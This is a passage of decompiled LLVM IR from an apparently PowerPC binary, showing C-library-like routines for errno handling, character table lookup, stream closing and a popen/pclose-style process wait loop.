dec_label_pc_100048c8:                            ; preds = %dec_label_pc_1000489c, %dec_label_pc_10004884, %dec_label_pc_100048bc
  %v0_100048cc = phi i32 [ %v0_100048ac, %dec_label_pc_1000489c ], [ %storemerge, %dec_label_pc_10004884 ], [ -1, %dec_label_pc_100048bc ]
  ret i32 %v0_100048cc

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100048c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004884, { 1, 0 }
}

define i32 @function_100048e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_100048e0:
  %r31.global-to-local = alloca i32, align 4
  %v0_100048f8 = call i32 @__asm_mfcr()
  %v1_100048fc = and i32 %v0_100048f8, 268435456
  %v3_100048fc = icmp eq i32 %v1_100048fc, 0
  store i32 %v0_100048f8, i32* %r31.global-to-local, align 4
  br i1 %v3_100048fc, label %dec_label_pc_10004914, label %dec_label_pc_10004908

dec_label_pc_10004908:                            ; preds = %dec_label_pc_100048e0
  %v0_10004908 = call i32 @function_10004b48()
  %v0_1000490c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000490c = inttoptr i32 %v0_10004908 to i32*
  store i32 %v0_1000490c, i32* %v2_1000490c, align 4
  br label %dec_label_pc_10004914

dec_label_pc_10004914:                            ; preds = %dec_label_pc_100048e0, %dec_label_pc_10004908
  %v0_10004924 = phi i32 [ %v0_100048f8, %dec_label_pc_100048e0 ], [ -1, %dec_label_pc_10004908 ]
  ret i32 %v0_10004924

; uselistorder directives
  uselistorder label %dec_label_pc_10004914, { 1, 0 }
}

define i32 @function_10004928() local_unnamed_addr {
dec_label_pc_10004928:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004940 = call i32 @__asm_mfcr()
  %v1_10004944 = and i32 %v0_10004940, 268435456
  %v3_10004944 = icmp eq i32 %v1_10004944, 0
  store i32 %v0_10004940, i32* %r31.global-to-local, align 4
  br i1 %v3_10004944, label %dec_label_pc_1000495c, label %dec_label_pc_10004950

dec_label_pc_10004950:                            ; preds = %dec_label_pc_10004928
  %v0_10004950 = call i32 @function_10004b48()
  %v0_10004954 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004954 = inttoptr i32 %v0_10004950 to i32*
  store i32 %v0_10004954, i32* %v2_10004954, align 4
  br label %dec_label_pc_1000495c

dec_label_pc_1000495c:                            ; preds = %dec_label_pc_10004928, %dec_label_pc_10004950
  %v0_1000496c = phi i32 [ %v0_10004940, %dec_label_pc_10004928 ], [ -1, %dec_label_pc_10004950 ]
  ret i32 %v0_1000496c

; uselistorder directives
  uselistorder label %dec_label_pc_1000495c, { 1, 0 }
}

define i32 @function_10004970() local_unnamed_addr {
dec_label_pc_10004970:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004988 = call i32 @__asm_mfcr()
  %v1_1000498c = and i32 %v0_10004988, 268435456
  %v3_1000498c = icmp eq i32 %v1_1000498c, 0
  store i32 %v0_10004988, i32* %r31.global-to-local, align 4
  br i1 %v3_1000498c, label %dec_label_pc_100049a4, label %dec_label_pc_10004998

dec_label_pc_10004998:                            ; preds = %dec_label_pc_10004970
  %v0_10004998 = call i32 @function_10004b48()
  %v0_1000499c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000499c = inttoptr i32 %v0_10004998 to i32*
  store i32 %v0_1000499c, i32* %v2_1000499c, align 4
  br label %dec_label_pc_100049a4

dec_label_pc_100049a4:                            ; preds = %dec_label_pc_10004970, %dec_label_pc_10004998
  %v0_100049b4 = phi i32 [ %v0_10004988, %dec_label_pc_10004970 ], [ -1, %dec_label_pc_10004998 ]
  ret i32 %v0_100049b4

; uselistorder directives
  uselistorder label %dec_label_pc_100049a4, { 1, 0 }
}

define i32 @function_100049b8() local_unnamed_addr {
dec_label_pc_100049b8:
  %r31.global-to-local = alloca i32, align 4
  %v0_100049d0 = call i32 @__asm_mfcr()
  %v1_100049d4 = and i32 %v0_100049d0, 268435456
  %v3_100049d4 = icmp eq i32 %v1_100049d4, 0
  store i32 %v0_100049d0, i32* %r31.global-to-local, align 4
  br i1 %v3_100049d4, label %dec_label_pc_100049ec, label %dec_label_pc_100049e0

dec_label_pc_100049e0:                            ; preds = %dec_label_pc_100049b8
  %v0_100049e0 = call i32 @function_10004b48()
  %v0_100049e4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100049e4 = inttoptr i32 %v0_100049e0 to i32*
  store i32 %v0_100049e4, i32* %v2_100049e4, align 4
  br label %dec_label_pc_100049ec

dec_label_pc_100049ec:                            ; preds = %dec_label_pc_100049b8, %dec_label_pc_100049e0
  %v0_100049fc = phi i32 [ %v0_100049d0, %dec_label_pc_100049b8 ], [ -1, %dec_label_pc_100049e0 ]
  ret i32 %v0_100049fc

; uselistorder directives
  uselistorder label %dec_label_pc_100049ec, { 1, 0 }
}

define i32 @function_10004a00(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004a00:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004a18 = call i32 @__asm_mfcr()
  %v1_10004a1c = and i32 %v0_10004a18, 268435456
  %v3_10004a1c = icmp eq i32 %v1_10004a1c, 0
  store i32 %v0_10004a18, i32* %r31.global-to-local, align 4
  br i1 %v3_10004a1c, label %dec_label_pc_10004a34, label %dec_label_pc_10004a28

dec_label_pc_10004a28:                            ; preds = %dec_label_pc_10004a00
  %v0_10004a28 = call i32 @function_10004b48()
  %v0_10004a2c = load i32, i32* %r31.global-to-local, align 4
  %v2_10004a2c = inttoptr i32 %v0_10004a28 to i32*
  store i32 %v0_10004a2c, i32* %v2_10004a2c, align 4
  br label %dec_label_pc_10004a34

dec_label_pc_10004a34:                            ; preds = %dec_label_pc_10004a00, %dec_label_pc_10004a28
  %v0_10004a44 = phi i32 [ %v0_10004a18, %dec_label_pc_10004a00 ], [ -1, %dec_label_pc_10004a28 ]
  ret i32 %v0_10004a44

; uselistorder directives
  uselistorder label %dec_label_pc_10004a34, { 1, 0 }
}

define i32 @function_10004a48(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10004a48:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004a60 = call i32 @__asm_mfcr()
  %v1_10004a64 = and i32 %v0_10004a60, 268435456
  %v3_10004a64 = icmp eq i32 %v1_10004a64, 0
  store i32 %v0_10004a60, i32* %r31.global-to-local, align 4
  br i1 %v3_10004a64, label %dec_label_pc_10004a7c, label %dec_label_pc_10004a70

dec_label_pc_10004a70:                            ; preds = %dec_label_pc_10004a48
  %v0_10004a70 = call i32 @function_10004b48()
  %v0_10004a74 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004a74 = inttoptr i32 %v0_10004a70 to i32*
  store i32 %v0_10004a74, i32* %v2_10004a74, align 4
  br label %dec_label_pc_10004a7c

dec_label_pc_10004a7c:                            ; preds = %dec_label_pc_10004a48, %dec_label_pc_10004a70
  %v0_10004a8c = phi i32 [ %v0_10004a60, %dec_label_pc_10004a48 ], [ -1, %dec_label_pc_10004a70 ]
  ret i32 %v0_10004a8c

; uselistorder directives
  uselistorder label %dec_label_pc_10004a7c, { 1, 0 }
}

define i32 @function_10004a90(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004a90:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004aa8 = call i32 @__asm_mfcr()
  %v1_10004aac = and i32 %v0_10004aa8, 268435456
  %v3_10004aac = icmp eq i32 %v1_10004aac, 0
  store i32 %v0_10004aa8, i32* %r31.global-to-local, align 4
  br i1 %v3_10004aac, label %dec_label_pc_10004ac4, label %dec_label_pc_10004ab8

dec_label_pc_10004ab8:                            ; preds = %dec_label_pc_10004a90
  %v0_10004ab8 = call i32 @function_10004b48()
  %v0_10004abc = load i32, i32* %r31.global-to-local, align 4
  %v2_10004abc = inttoptr i32 %v0_10004ab8 to i32*
  store i32 %v0_10004abc, i32* %v2_10004abc, align 4
  br label %dec_label_pc_10004ac4

dec_label_pc_10004ac4:                            ; preds = %dec_label_pc_10004a90, %dec_label_pc_10004ab8
  %v0_10004ad4 = phi i32 [ %v0_10004aa8, %dec_label_pc_10004a90 ], [ -1, %dec_label_pc_10004ab8 ]
  ret i32 %v0_10004ad4

; uselistorder directives
  uselistorder label %dec_label_pc_10004ac4, { 1, 0 }
}

define i32 @function_10004ad8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10004ad8:
  %v1_10004adc = call i32 @function_10009504(i32 0)
  ret i32 %v1_10004adc
}

define i32 @function_10004ae0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004ae0:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004af8 = call i32 @__asm_mfcr()
  %v1_10004afc = and i32 %v0_10004af8, 268435456
  %v3_10004afc = icmp eq i32 %v1_10004afc, 0
  store i32 %v0_10004af8, i32* %r31.global-to-local, align 4
  br i1 %v3_10004afc, label %dec_label_pc_10004b14, label %dec_label_pc_10004b08

dec_label_pc_10004b08:                            ; preds = %dec_label_pc_10004ae0
  %v0_10004b08 = call i32 @function_10004b48()
  %v0_10004b0c = load i32, i32* %r31.global-to-local, align 4
  %v2_10004b0c = inttoptr i32 %v0_10004b08 to i32*
  store i32 %v0_10004b0c, i32* %v2_10004b0c, align 4
  br label %dec_label_pc_10004b14

dec_label_pc_10004b14:                            ; preds = %dec_label_pc_10004ae0, %dec_label_pc_10004b08
  %v0_10004b24 = phi i32 [ %v0_10004af8, %dec_label_pc_10004ae0 ], [ -1, %dec_label_pc_10004b08 ]
  ret i32 %v0_10004b24

; uselistorder directives
  uselistorder label %dec_label_pc_10004b14, { 1, 0 }
}

define i32 @function_10004b28(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004b28:
  %v1_10004b28 = add i32 %arg1, 128
  %v1_10004b2c = mul i32 %arg1, 2
  %v2_10004b30 = icmp ugt i32 %v1_10004b28, 383
  %v0_10004b34 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10004b30, i32 %v0_10004b34)
  %v3_10004b3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1056) to i32*), align 4
  %v2_10004b40 = add i32 %v1_10004b2c, %v3_10004b3c
  %v3_10004b40 = inttoptr i32 %v2_10004b40 to i16*
  %v4_10004b40 = load i16, i16* %v3_10004b40, align 2
  %v5_10004b40 = sext i16 %v4_10004b40 to i32
  ret i32 %v5_10004b40
}

define i32 @function_10004b48() local_unnamed_addr {
dec_label_pc_10004b48:
  ret i32 ptrtoint (i32* @global_var_100104bc.193 to i32)
}

define i32 @function_10004b54(i16* %arg1) local_unnamed_addr {
dec_label_pc_10004b54:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10004b68 = add i32 %tmp, 52
  %v3_10004b68 = inttoptr i32 %v2_10004b68 to i32*
  %v4_10004b68 = load i32, i32* %v3_10004b68, align 4
  store i32 %v4_10004b68, i32* @r28, align 4
  %v3_10004b6c = icmp eq i32 %v4_10004b68, 0
  store i1 %v3_10004b6c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004b6c, label %dec_label_pc_10004b74, label %dec_label_pc_10004b94

dec_label_pc_10004b74:                            ; preds = %dec_label_pc_10004b54
  %v2_10004b7c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10004b7c, i32* @r3, align 4
  %v0_10004b88 = call i32 @function_10008c80()
  %v0_10004b90 = call i32 @function_10008c78()
  %v0_10004b94.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004b94

dec_label_pc_10004b94:                            ; preds = %dec_label_pc_10004b54, %dec_label_pc_10004b74
  %v0_10004ba4 = phi i32 [ %tmp, %dec_label_pc_10004b54 ], [ %v0_10004b94.pre, %dec_label_pc_10004b74 ]
  %v1_10004b94 = inttoptr i32 %v0_10004ba4 to i16*
  %v2_10004b94 = load i16, i16* %v1_10004b94, align 2
  %v3_10004b94 = zext i16 %v2_10004b94 to i32
  store i32 0, i32* @r27, align 4
  %v1_10004b9c = and i32 %v3_10004b94, 64
  %v3_10004b9c = icmp eq i32 %v1_10004b9c, 0
  br i1 %v3_10004b9c, label %dec_label_pc_10004bb0, label %dec_label_pc_10004ba4

dec_label_pc_10004ba4:                            ; preds = %dec_label_pc_10004b94
  store i32 268454828, i32* @lr, align 4
  %v4_10004ba8 = call i32 @function_100068dc(i16* %v1_10004b94, i32 %v1_10004b9c)
  store i32 %v4_10004ba8, i32* @r27, align 4
  %v0_10004bb0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004bb0

dec_label_pc_10004bb0:                            ; preds = %dec_label_pc_10004b94, %dec_label_pc_10004ba4
  %v0_10004bb0 = phi i32 [ %v0_10004ba4, %dec_label_pc_10004b94 ], [ %v0_10004bb0.pre, %dec_label_pc_10004ba4 ]
  %v1_10004bb0 = add i32 %v0_10004bb0, 4
  %v2_10004bb0 = inttoptr i32 %v1_10004bb0 to i32*
  %v3_10004bb0 = load i32, i32* %v2_10004bb0, align 4
  store i32 268454840, i32* @lr, align 4
  %v1_10004bb4 = call i32 @function_100048e0(i32 %v3_10004bb0)
  %v3_10004bb8 = icmp eq i32 %v1_10004bb4, 0
  store i1 %v3_10004bb8, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10004bb4, -1
  br i1 %tmp8, label %dec_label_pc_10004bc4, label %dec_label_pc_10004bc0

dec_label_pc_10004bc0:                            ; preds = %dec_label_pc_10004bb0
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10004bc4

dec_label_pc_10004bc4:                            ; preds = %dec_label_pc_10004bb0, %dec_label_pc_10004bc0
  %v1_10004bcc = load i32, i32* @r31, align 4
  %v2_10004bcc = add i32 %v1_10004bcc, 4
  %v3_10004bcc = inttoptr i32 %v2_10004bcc to i32*
  store i32 -1, i32* %v3_10004bcc, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008c78.194 to i32), i32* @r26, align 4
  %v2_10004bd8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10004bd8, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_100100fc.195 to i32), i32* @r29, align 4
  store i32 %v2_10004bd8, i32* @r3, align 4
  %v0_10004bec = call i32 @function_10008c80()
  %v0_10004bf4 = call i32 @function_10008c78()
  %v3_10004bfc = load i32, i32* @global_var_10010494.196, align 4
  store i32 %v2_10004bd8, i32* @r3, align 4
  %v1_10004c08 = add i32 %v3_10004bfc, 1
  store i32 %v1_10004c08, i32* @global_var_10010494.196, align 4
  %v0_10004c10 = call i32 @function_10008c80()
  %v0_10004c14 = load i32, i32* @r31, align 4
  %v1_10004c14 = inttoptr i32 %v0_10004c14 to i16*
  %v2_10004c14 = load i16, i16* %v1_10004c14, align 2
  %v3_10004c14 = zext i16 %v2_10004c14 to i32
  %v0_10004c18 = load i32, i32* @r28, align 4
  %v3_10004c18 = icmp eq i32 %v0_10004c18, 0
  store i1 %v3_10004c18, i1* %cr7_eq.global-to-local, align 1
  %v1_10004c1c = call i32 @__asm_rlwinm(i32 %v3_10004c14, i32 0, i32 17, i32 18)
  %v1_10004c24 = or i32 %v1_10004c1c, 48
  %v1_10004c28 = trunc i32 %v1_10004c24 to i16
  %v2_10004c28 = load i32, i32* @r31, align 4
  %v3_10004c28 = inttoptr i32 %v2_10004c28 to i16*
  store i16 %v1_10004c28, i16* %v3_10004c28, align 2
  %v0_10004c2c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004c2c, label %dec_label_pc_10004c30, label %dec_label_pc_10004c3c

dec_label_pc_10004c30:                            ; preds = %dec_label_pc_10004bc4
  %v2_10004c30 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10004c30, i32* @r3, align 4
  %v0_10004c38 = call i32 @function_10008c80()
  br label %dec_label_pc_10004c3c

dec_label_pc_10004c3c:                            ; preds = %dec_label_pc_10004bc4, %dec_label_pc_10004c30
  %v0_10004c3c = load i32, i32* @r31, align 4
  %v1_10004c3c = inttoptr i32 %v0_10004c3c to i16*
  %v2_10004c3c = load i16, i16* %v1_10004c3c, align 2
  %v1_10004c40 = and i16 %v2_10004c3c, 16384
  %v3_10004c40 = icmp eq i16 %v1_10004c40, 0
  br i1 %v3_10004c40, label %dec_label_pc_10004c50, label %dec_label_pc_10004c48

dec_label_pc_10004c48:                            ; preds = %dec_label_pc_10004c3c
  %v1_10004c48 = add i32 %v0_10004c3c, 8
  %v2_10004c48 = inttoptr i32 %v1_10004c48 to i32*
  %v3_10004c48 = load i32, i32* %v2_10004c48, align 4
  store i32 268454992, i32* @lr, align 4
  %v1_10004c4c = call i32 @function_10007e44(i32 %v3_10004c48)
  br label %dec_label_pc_10004c50

dec_label_pc_10004c50:                            ; preds = %dec_label_pc_10004c3c, %dec_label_pc_10004c48
  store i32 %v2_10004bd8, i32* @r3, align 4
  %v0_10004c5c = call i32 @function_10008c80()
  %v0_10004c64 = call i32 @function_10008c78()
  %v3_10004c6c = load i32, i32* @global_var_10010498.197, align 4
  store i32 %v2_10004bd8, i32* @r3, align 4
  %v1_10004c78 = add i32 %v3_10004c6c, 1
  store i32 %v1_10004c78, i32* @global_var_10010498.197, align 4
  %v0_10004c80 = call i32 @function_10008c80()
  store i32 268455048, i32* @lr, align 4
  %v0_10004c84 = call i32 @function_100067bc()
  %v0_10004c8c = load i32, i32* @r27, align 4
  ret i32 %v0_10004c8c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10004c50, { 1, 0 }
  uselistorder label %dec_label_pc_10004c3c, { 1, 0 }
  uselistorder label %dec_label_pc_10004bc4, { 1, 0 }
  uselistorder label %dec_label_pc_10004bb0, { 1, 0 }
  uselistorder label %dec_label_pc_10004b94, { 1, 0 }
}

define i32 @function_10004ca0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004ca0:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10004ca8 = call i32 @function_10005144(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10004ca8
}

define i32 @function_10004cac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004cac:
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 -1, i32* @r4, align 4
  %v0_10004cb8 = call i32 @function_10004d48()
  ret i32 %v0_10004cb8
}

define i32 @function_10004cbc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004cbc:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_10004cdc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10004cdc, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10004d2c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10004d2c, i32* %stack_var_-96, align 4
  store i32 268455224, i32* @lr, align 4
  %v0_10004d34 = call i32 @function_10004d48()
  ret i32 %v0_10004d34
}

define i32 @function_10004d48() local_unnamed_addr {
dec_label_pc_10004d48:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10004d6c = load i32, i32* @r4, align 4
  store i32 %v0_10004d6c, i32* @r27, align 4
  %v0_10004d70 = load i32, i32* @r3, align 4
  %v1_10004d70 = sub i32 -1, %v0_10004d70
  store i32 %v1_10004d70, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10004d70, i32* %r31.global-to-local, align 4
  %v2_10004d84 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10004d84, i32* @r3, align 4
  %v0_10004d88 = load i32, i32* @r5, align 4
  store i32 %v0_10004d88, i32* %r29.global-to-local, align 4
  %v0_10004d8c = load i32, i32* @r6, align 4
  store i32 %v0_10004d8c, i32* @r28, align 4
  store i32 268455324, i32* @lr, align 4
  %v0_10004d98 = call i32 @function_10005478()
  %v0_10004d9c = load i32, i32* %r30.global-to-local, align 4
  %v1_10004d9c = load i32, i32* @r27, align 4
  %v3_10004d9c = icmp ugt i32 %v0_10004d9c, %v1_10004d9c
  %v0_10004da0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10004da0, i32* @r4, align 4
  %v0_10004da4 = load i32, i32* @r28, align 4
  store i32 %v0_10004da4, i32* @r5, align 4
  %v2_10004da8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10004da8, i32* @r3, align 4
  br i1 %v3_10004d9c, label %dec_label_pc_10004db4, label %dec_label_pc_10004db8

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004d48
  store i32 %v1_10004d9c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10004db8

dec_label_pc_10004db8:                            ; preds = %dec_label_pc_10004d48, %dec_label_pc_10004db4
  %v1_10004db8 = phi i32 [ %v0_10004d9c, %dec_label_pc_10004d48 ], [ %v1_10004d9c, %dec_label_pc_10004db4 ]
  %v0_10004db8 = load i32, i32* %r31.global-to-local, align 4
  store i32 268455384, i32* @lr, align 4
  %v0_10004dd4 = call i32 @function_10005698()
  %v0_10004dd8 = load i32, i32* @r30, align 4
  %v3_10004dd8 = icmp eq i32 %v0_10004dd8, 0
  br i1 %v3_10004dd8, label %dec_label_pc_10004e00, label %dec_label_pc_10004de0

dec_label_pc_10004de0:                            ; preds = %dec_label_pc_10004db8
  %v4_10004dec = icmp eq i32 %v1_10004db8, 0
  %v1_10004de8 = sext i1 %v4_10004dec to i32
  %v0_10004df4.v0_10004db8 = add i32 %v0_10004db8, %v1_10004de8
  %stack_var_-88.0 = inttoptr i32 %v0_10004df4.v0_10004db8 to i8*
  %v0_10004dfc = load i32, i32* @r26, align 4
  %v1_10004dfc = trunc i32 %v0_10004dfc to i8
  store i8 %v1_10004dfc, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_10004e00

dec_label_pc_10004e00:                            ; preds = %dec_label_pc_10004db8, %dec_label_pc_10004de0
  ret i32 %v0_10004dd4

; uselistorder directives
  uselistorder i32 %v0_10004d70, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_10004e00, { 1, 0 }
  uselistorder label %dec_label_pc_10004db8, { 1, 0 }
}

define i32 @function_10004e14(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004e14:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100108fc.199 to i32), i32* %r29.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v2_10004e38 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10004e38, i32* @r3, align 4
  %v0_10004e40 = call i32 @function_10008c80()
  %v0_10004e48 = call i32 @function_10008c78()
  %v3_10004e50 = load i32, i32* @global_var_10010490.200, align 4
  store i32 %v3_10004e50, i32* %r29.global-to-local, align 4
  %v3_10004e54 = icmp eq i32 %v3_10004e50, 0
  br i1 %v3_10004e54, label %dec_label_pc_10004eb0, label %dec_label_pc_10004e5c

dec_label_pc_10004e5c:                            ; preds = %dec_label_pc_10004e14
  %v1_10004e5c = add i32 %v3_10004e50, 4
  %v2_10004e5c = inttoptr i32 %v1_10004e5c to i32*
  %v3_10004e5c = load i32, i32* %v2_10004e5c, align 4
  %v1_10004e60 = load i32, i32* @r31, align 4
  %v4_10004e60 = icmp eq i32 %v3_10004e5c, %v1_10004e60
  br i1 %v4_10004e60, label %dec_label_pc_10004e68, label %dec_label_pc_10004e8c

dec_label_pc_10004e68:                            ; preds = %dec_label_pc_10004e5c
  %v1_10004e68 = inttoptr i32 %v3_10004e50 to i32*
  %v2_10004e68 = load i32, i32* %v1_10004e68, align 4
  store i32 %v2_10004e68, i32* @global_var_10010490.200, align 4
  br label %dec_label_pc_10004eb0

dec_label_pc_10004e74:                            ; preds = %dec_label_pc_10004e8c
  %v0_10004e74 = call i32 @function_10004b48()
  %v2_10004e7c = inttoptr i32 %v0_10004e74 to i32*
  store i32 22, i32* %v2_10004e7c, align 4
  br label %dec_label_pc_10004eb0

dec_label_pc_10004e84:                            ; preds = %dec_label_pc_10004ed8
  %v3_10004e84 = load i32, i32* %stack_var_-56, align 4
  br label %dec_label_pc_10004f04

dec_label_pc_10004e8c:                            ; preds = %dec_label_pc_10004e5c, %dec_label_pc_10004e9c
  %v1_10004eac = phi i32 [ %v2_10004e90, %dec_label_pc_10004e9c ], [ %v3_10004e50, %dec_label_pc_10004e5c ]
  %v1_10004e90 = inttoptr i32 %v1_10004eac to i32*
  %v2_10004e90 = load i32, i32* %v1_10004e90, align 4
  store i32 %v2_10004e90, i32* %r29.global-to-local, align 4
  %v3_10004e94 = icmp eq i32 %v2_10004e90, 0
  br i1 %v3_10004e94, label %dec_label_pc_10004e74, label %dec_label_pc_10004e9c

dec_label_pc_10004e9c:                            ; preds = %dec_label_pc_10004e8c
  %v1_10004e9c = add i32 %v2_10004e90, 4
  %v2_10004e9c = inttoptr i32 %v1_10004e9c to i32*
  %v3_10004e9c = load i32, i32* %v2_10004e9c, align 4
  %v4_10004ea0 = icmp eq i32 %v3_10004e9c, %v1_10004e60
  br i1 %v4_10004ea0, label %dec_label_pc_10004ea8, label %dec_label_pc_10004e8c

dec_label_pc_10004ea8:                            ; preds = %dec_label_pc_10004e9c
  %v1_10004ea8 = inttoptr i32 %v2_10004e90 to i32*
  %v2_10004ea8 = load i32, i32* %v1_10004ea8, align 4
  store i32 %v2_10004ea8, i32* %v1_10004e90, align 4
  br label %dec_label_pc_10004eb0

dec_label_pc_10004eb0:                            ; preds = %dec_label_pc_10004e14, %dec_label_pc_10004e74, %dec_label_pc_10004e68, %dec_label_pc_10004ea8
  store i32 %v2_10004e38, i32* @r3, align 4
  %v0_10004eb8 = call i32 @function_10008c80()
  %v0_10004ebc = load i32, i32* %r29.global-to-local, align 4
  %v3_10004ebc = icmp eq i32 %v0_10004ebc, 0
  br i1 %v3_10004ebc, label %dec_label_pc_10004f04, label %dec_label_pc_10004ec4

dec_label_pc_10004ec4:                            ; preds = %dec_label_pc_10004eb0
  %v1_10004ec8 = add i32 %v0_10004ebc, 8
  %v2_10004ec8 = inttoptr i32 %v1_10004ec8 to i32*
  %v3_10004ec8 = load i32, i32* %v2_10004ec8, align 4
  store i32 %v3_10004ec8, i32* %r29.global-to-local, align 4
  store i32 268455632, i32* @lr, align 4
  %v1_10004ecc = call i32 @function_10007e44(i32 %v0_10004ebc)
  %v0_10004ed0 = load i32, i32* @r31, align 4
  store i32 268455640, i32* @lr, align 4
  %v1_10004ed4 = inttoptr i32 %v0_10004ed0 to i16*
  %v2_10004ed4 = call i32 @function_10004b54(i16* %v1_10004ed4)
  %v2_10004ed8 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_10004ed8

dec_label_pc_10004ed8:                            ; preds = %dec_label_pc_10004ef0, %dec_label_pc_10004ec4
  %v0_10004ee0 = load i32, i32* @r29, align 4
  store i32 268455656, i32* @lr, align 4
  %v3_10004ee4 = call i32 @function_10004ad8(i32 %v0_10004ee0, i32 %v2_10004ed8, i32 0)
  %tmp8 = icmp sgt i32 %v3_10004ee4, -1
  br i1 %tmp8, label %dec_label_pc_10004e84, label %dec_label_pc_10004ef0

dec_label_pc_10004ef0:                            ; preds = %dec_label_pc_10004ed8
  %v0_10004ef0 = call i32 @function_10004b48()
  %v1_10004ef4 = inttoptr i32 %v0_10004ef0 to i32*
  %v2_10004ef4 = load i32, i32* %v1_10004ef4, align 4
  %v3_10004ef8 = icmp eq i32 %v2_10004ef4, 4
  br i1 %v3_10004ef8, label %dec_label_pc_10004ed8, label %dec_label_pc_10004f04

dec_label_pc_10004f04:                            ; preds = %dec_label_pc_10004ef0, %dec_label_pc_10004eb0, %dec_label_pc_10004e84
  %storemerge = phi i32 [ %v3_10004e84, %dec_label_pc_10004e84 ], [ -1, %dec_label_pc_10004eb0 ], [ -1, %dec_label_pc_10004ef0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10004ebc, { 1, 0, 2 }
  uselistorder i32 %v2_10004e90, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_10004eb0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10004e8c, { 1, 0 }
}

define i32 @function_10004f18(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10004f18:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_10004f2c = load i8, i8* %arg2, align 1
  %v3_10004f34 = icmp eq i8 %v3_10004f2c, 119
  br i1 %v3_10004f34, label %dec_label_pc_10004f64, label %dec_label_pc_10004f3c

dec_label_pc_10004f3c:                            ; preds = %dec_label_pc_10004f18
  %v3_10004f3c = icmp eq i8 %v3_10004f2c, 114
